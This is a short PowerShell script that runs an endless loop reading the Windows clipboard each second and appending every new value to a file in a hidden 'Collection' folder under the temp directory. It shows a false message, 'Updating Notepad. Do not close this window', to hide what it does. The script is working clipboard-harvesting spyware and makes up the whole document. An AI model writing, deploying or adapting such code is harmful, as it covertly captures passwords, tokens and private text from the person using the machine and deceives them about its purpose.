Add-Type -AssemblyName System.Windows.Forms

$outputFilePath = "$env:TEMP\Collection\ClipboardContent.txt"

$previousText = ""
Write-Host "Updating Notepad. Do not close this window"
while ($true) {
    $currentText = [System.Windows.Forms.Clipboard]::GetText()
    if ($currentText -ne $previousText -and $currentText -ne "") {
        Add-Content -Path $outputFilePath -Value $currentText
        $previousText = $currentText
    }
    Start-Sleep -Seconds 1
}
